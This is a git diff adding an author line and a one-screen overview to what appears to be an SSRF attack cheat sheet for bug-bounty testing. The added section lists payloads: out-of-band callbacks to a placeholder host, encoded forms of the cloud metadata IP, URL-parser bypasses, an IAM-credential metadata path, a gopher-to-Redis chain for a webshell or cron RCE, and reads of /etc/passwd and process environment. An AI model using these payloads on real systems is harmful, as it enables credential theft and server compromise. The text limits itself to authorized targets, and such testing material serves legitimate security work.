@@ -1,6 +1,44 @@
 # SSRF Attack Arsenal — IP Encodings, Metadata URLs, Bypasses & gopher Payloads
 
+**Author:** x8bitranjit
+
 > Companion to `SSRF_TESTING_GUIDE.md`. **Baseline first** (guide §4: server source IP, observability class), then **reach inward** (guide §5). Replace `YOUR.oast.fun` with your Collaborator/interactsh host and `YOUR-HOST` with your redirect server. Authorized targets only; prove creds with `sts get-caller-identity` and stop (guide §23).
+
+---
+
+## §0.0 — The whole attack in one sequence
+
+*What & when:* the entire SSRF run on one screen — the **decision spine** every lettered block below plugs into. SSRF is a *network-position* bug: the value isn't "the server fetched a URL," it's **how deep inward you can steer that fetch and what you obtain there**. Prove **reach** (OOB, not just "no error"), push past the filter, climb to the deepest target, and take one **benign** proof. Follow the arrows to the matching section.
+
+```
+# ── 1. RECON every URL-fetch sink (guide §3) ─────────────────────────────
+?url= ?next= ?dest= ?feed= ?webhook= ?image= ?proxy= ?callback= · JSON url fields · SSRF in headers
+#   + known product endpoints: Jira /plugins/servlet/gadgets/makeRequest (CVE-2019-8451), Grafana, Jenkins, GitLab...
+
+# ── 2. BASELINE: does the SERVER fetch it? (guide §4) — the OOB gate, "callback ≠ impact" ──
+url=http://YOUR.oast.fun/   → interactsh hit from the SERVER's source IP = SSRF confirmed (your IP = NOT SSRF)
+#   also inject YOUR.oast.fun into X-Forwarded-For / Referer / X-Forwarded-Host / True-Client-IP on EVERY request
+
+# ── 3. MAP reachability — outward ring → inward (guide §5) ────────────────
+127.0.0.1 / localhost / [::1]  →  internal 10./172./192.  →  169.254.169.254 (metadata)  →  file:///etc/hostname
+#   deepest thing that answers = your severity ceiling
+
+# ── 4. BLOCKED? walk the bypass ladder (guide §6–§10) ────────────────────
+obfuscate IP:  decimal 2852039166 · octal · hex · [::ffff:169.254.169.254]        (denylist matched the dotted form)
+parser gap:    http://allowed.com@169.254.169.254/ · #  · \  · allowed.com.evil    (validator vs client disagree)
+DNS:           rebinding (TOCTOU allowlist) · wildcard-DNS A-record → 169.254.169.254
+redirect:      your 302 → internal/metadata/gopher   |   protocol:  gopher:// dict:// file:// ftp://
+
+# ── 5. CASH OUT by what you reached (guide §11–§16) — benign proof, then STOP ──
+METADATA (crown jewel §11): IMDSv1 → /latest/meta-data/iam/security-credentials/<role> → creds
+                            IMDSv2 → needs token header → redirect→gopher PUT-handshake (or say so honestly §19)
+                            GCP → Metadata-Flavor:Google header · Azure → Metadata:true + api-version
+INTERNAL SVC (§13): gopher://127.0.0.1:6379/_ Redis → SET webshell/cron → RCE  · Jenkins/registry/k8s API
+FILE (§14): file:///etc/passwd · file:///proc/self/environ    |   PDF/headless (§16.1): <iframe metadata>+<img file://>
+PROVE: aws sts get-caller-identity  (read-only) — do NOT s3 ls / exfiltrate. That call alone = Critical.
+```
+
+> **Cash-out map (guide §21 severity):** external-only reach = **Low** → internal-service reach = **Medium/High** → **metadata → IAM creds** or **gopher → internal RCE** = **Critical, CWE-918** (the Capital One / ProxyLogon arcs, guide §26). A callback with **no** inward reach or concrete loot? Not yet impactful — don't over-report (guide §20). Full worked run: **guide Appendix D**.
 
 ---
 
